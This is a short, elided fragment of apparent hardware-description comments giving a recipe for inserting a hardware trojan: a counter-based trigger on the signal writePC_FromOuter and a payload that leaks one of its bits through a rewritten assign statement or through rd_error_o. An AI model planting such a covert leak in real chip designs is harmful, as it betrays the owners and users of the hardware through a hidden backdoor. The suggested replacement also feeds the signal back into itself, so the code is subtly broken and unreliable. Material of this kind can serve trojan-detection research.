 ...
 *   
 * Trigger: Counter on writePC_FromOuter
 * Payload: Route writePC_FromOuter[0] to observable output
 * 
...
//   Find the assign for writePC_FromOuter (or rd_error_o as fallback):
//     assign writePC_FromOuter = <normal_expr>;
//   Replace with:
//     assign writePC_FromOuter = trojan_active ? writePC_FromOuter[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? writePC_FromOuter[0] : 1'b0;
//
